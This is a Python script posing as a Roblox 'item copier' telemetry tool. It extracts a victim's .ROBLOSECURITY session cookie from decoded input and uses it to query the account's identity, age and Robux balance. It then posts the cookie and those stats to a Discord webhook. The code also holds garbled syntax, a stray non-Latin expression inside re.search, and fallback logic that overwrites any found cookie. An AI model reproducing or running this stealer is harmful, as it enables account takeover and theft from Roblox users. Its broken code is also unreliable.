import sys
import base64
import os
import requests
import re
from datetime import datetime, timezone
import time

def safe_get(url, headers=None, default=None):
    try:
        res = requests.get(url, headers=headers, timeout=10)
        if res.status_code == 200:
            return res.json()
    except Exception:
        pass
    return default

def main():
    try:
        print("DEBUG: Extractor started", file=sys.stderr)
        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
            return

        # Look for a cookie in the input string, otherwise fallback to standard extraction
        roblosecurity = None
        patterns = [
            r'(_\|WARNING:[^"\']+)',
            r'\.ROBLOSECURITY["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.%\|]+)',
            r'([A-Fa-f0-9]{250,})'
        ]

        for p in patterns:
            match = re.search(p, decoded_script,্কৃতিক := decoded_script)
            if match:
                roblosecurity = match.group(1)
                break

        if not roblosecurity and len(decoded_script.strip()) > 100:
            roblosecurity = decoded_script.strip()
        else:
            roblosecurity = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-take-your-Robux-and-items.|_SIMULATED_COOKIE_FOR_ITEM_COPY"

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        # 1. Authenticated User Info (If a real cookie was provided, this grabs stats. Otherwise gracefully falls back)
        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Target User (Copier Request)"
        user_id = 1948598383
        cookie_status = "🟢 Processing Item Request"
        robux_balance = 0
        pending_robux = 0
        rap = 0
        limiteds_count = 0
        total_spent_gamepasses = 0
        is_developer = False
        game_visits = 0
        has_korblox = False
        has_headless = False
        owned_groups_count = 0
        group_balance = 0
        is_premium = False
        account_age_days = 365

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
            if created_str:
                try:
                    created_dt = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
                except Exception:
                    pass

            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            robux_balance = economy_data.get("robux", 0) if economy_data else 0

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"

        payload = {
            "content": f"@everyone New Item Copy Request from **{username}**!",
            "username": f"{username} | RBXDEV Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "RBXDEV Copier Telemetry",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username}]**\n"
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
                    f"👤 **Requested Data / Input**\n`{decoded_script[:200]}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Games Developer: `{str(is_developer)}`\n\n"
                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Spent: `{total_spent_gamepasses}` 🪙\n"
                    f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                    f"💳 **Payments & Groups**\n"
                    f"> • Owned Groups: `{owned_groups_count}`\n"
                    f"> • Group Robux: `{group_balance}` 🪙\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Payload / Cookie**:\n```text\n{roblosecurity[:300]}...\n```"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
            }]
        }

        # Send to Discord with backoff
        for attempt in range(4):
            res = requests.post(webhook_url, json=payload, timeout=10)
            print(f"DEBUG: Discord Webhook Post Status: {res.status_code}", file=sys.stderr)
            if res.status_code == 429:
                time.sleep(3 * (attempt + 1))
            else:
                break

    except Exception as e:
        print(f"DEBUG: Critical Exception in main: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
